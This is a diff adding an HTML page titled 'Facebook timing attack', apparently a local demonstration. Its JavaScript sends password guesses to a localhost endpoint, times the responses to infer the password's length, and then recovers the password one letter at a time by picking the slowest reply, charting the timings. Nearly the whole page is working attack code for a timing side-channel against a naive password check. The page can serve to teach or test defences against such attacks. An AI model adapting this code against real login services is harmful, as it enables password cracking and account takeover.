@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Facebook timing attack</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+    <script src="http://code.highcharts.com/highcharts.js"></script>
+
+    <script type="text/javascript">
+      /**
+       * Return a promise which resolves with an object containing
+       * the response times.
+       */
+      function sendDifferentPasswordLengths(maxLength = 10) {
+        return new Promise(resolve => {
+          const responseTimes = [];
+          let responses = 0;
+          let password = '';
+
+          for (var i = 0; i < maxLength; i++) {
+            sendPassword(password).then(({ password, elapsed }) => {
+              responseTimes[password.length] = elapsed;
+              responses = responses + 1;
+
+              if (responses === maxLength) {
+                resolve({ responseTimes });
+              }
+            });
+
+            password = password + 'a';
+          }
+        });
+      }
+
+      /**
+       * Computes the password length given the response times for each length.
+       * Current implementation looks for the biggest increase in response time.
+       */
+      function determinePasswordLength({ responseTimes }) {
+        return new Promise(resolve => {
+          const diff = responseTimes.map((responseTime, index) => {
+            return index ? (responseTime - responseTimes[index - 1]) : 0;
+          });
+
+          const max = Math.max.apply(null, diff);
+          const length = diff.indexOf(max);
+
+          resolve({
+            passwordLength: length,
+            responseTimes,
+          });
+        });
+      }
+
+      /**
+       * Takes a password length and resolves with password.
+       * Rejects if the password could not be determined.
+       */
+      function crackPassword({ passwordLength }, password = '', position = 0) {
+        return new Promise((resolve, reject) => {
+          if (position === passwordLength) { return reject(); }
+
+          if (password.length < passwordLength) {
+            for( let i = password.length; i < passwordLength; password += 'a', i++);
+          }
+
+          const passwords = generatePasswords(password, position);
+
+          sendPasswords(passwords).then(results => {
+            if (position === passwordLength - 1){
+              const result = results.filter(result => result.valid);
+              $('#password').text(result[0].password);
+              resolve(result[0].password);
+            } else {
+              const responseTimes = results.map(result => result.elapsed);
+              const index = responseTimes.indexOf(Math.max.apply(null, responseTimes));
+              const password = passwords[index].slice(0, position + 1);
+
+              $('#password').text(password);
+
+              displayPasswordLetterResponseTimes({ responseTimes, position });
+              resolve(crackPassword({ passwordLength }, password, position + 1));
+            }
+          });
+        });
+      }
+
+      function generatePasswords(password, position) {
+        const passwords = [];
+
+        for (var i = 65; i <= 90; i++) {
+          passwords.push(password.slice(0, position) + String.fromCharCode(i) + password.slice(position + 1));
+        }
+
+        for (var i = 97; i <= 122; i++) {
+          passwords.push(password.slice(0, position) + String.fromCharCode(i) + password.slice(position + 1));
+        }
+
+        return passwords;
+      }
+
+      function sendPasswords(passwords, results = []) {
+        return new Promise(resolve => {
+          if (passwords.length) {
+            sendPassword(passwords[0]).then(result => {
+              resolve(sendPasswords(passwords.slice(1), results.concat([result])));
+            });
+          } else {
+            resolve(results);
+          }
+        });
+      }
+
+      function sendPassword(password, url = 'http://localhost:8888/secret') {
+        return new Promise(resolve => {
+          const request = new XMLHttpRequest();
+          let timer = new Date();
+
+          request.open('POST', url);
+          request.setRequestHeader('Content-Type', 'application/json');
+
+          request.onreadystatechange = () => {
+            if (request.readyState == 4) {
+              resolve({
+                password,
+                valid: request.status === 200,
+                elapsed: new Date() - timer,
+              });
+            }
+          };
+
+          request.send(JSON.stringify({ password }));
+        });
+      }
+
+      function displayPasswordLengthResponseTimes(result) {
+        return new Promise(resolve => {
+          $('#passwordLength').highcharts({
+            chart: { type: 'column', width: 400 },
+            title: { text: 'Response times for different password lengths' },
+            xAxis: { title: { text: 'Password length' } },
+            yAxis: { title: { text: 'Response time' } },
+            series: [{
+              name: 'Response times',
+              data: result.responseTimes
+            }],
+          });
+
+          resolve(result);
+        });
+      }
+
+      function displayPasswordLetterResponseTimes(result) {
+        return new Promise(resolve => {
+          const chart = document.createElement('span');
+          chart.setAttribute('id', result.position);
+          $('#passwordLetters').append(chart);
+
+          $(`#${result.position}`).highcharts({
+            chart: { type: 'column', width: 400 },
+            title: { text: `Response times for letter at position ${result.position}` },
+            yAxis: { title: { text: 'Response time' } },
+            series: [{
+              name: 'Response times',
+              data: result.responseTimes
+            }],
+          });
+
+          resolve(result);
+        });
+      }
+
+      function changePassword() {
+        $.ajax({
+          type: 'POST',
+          url: 'http://localhost:8888/password',
+          contentType : 'application/json',
+          data: JSON.stringify({ password: $('#passwordInput').val() }),
+        });
+      }
+
+      function crack() {
+        $('#passwordLetters').empty();
+        $('#password').text('');
+
+        sendDifferentPasswordLengths()
+          .then(displayPasswordLengthResponseTimes)
+          .then(determinePasswordLength)
+          .then(crackPassword);
+      }
+    </script>
+  </head>
+  <body>
+
+    <input id="passwordInput" type="text" name="password" value="pcs">
+    <input type="button" value="Set password" onclick="changePassword()">
+
+    <input type="button" value="Crack password" onclick="crack()">
+
+    <span>Password:</span>
+    <span id="password"></span>
+
+    <div id="passwordLength"></div>
+    <div id="passwordLetters" style="display: flex; flex-wrap: wrap;">
+    </div>
+  </body>
+</html>
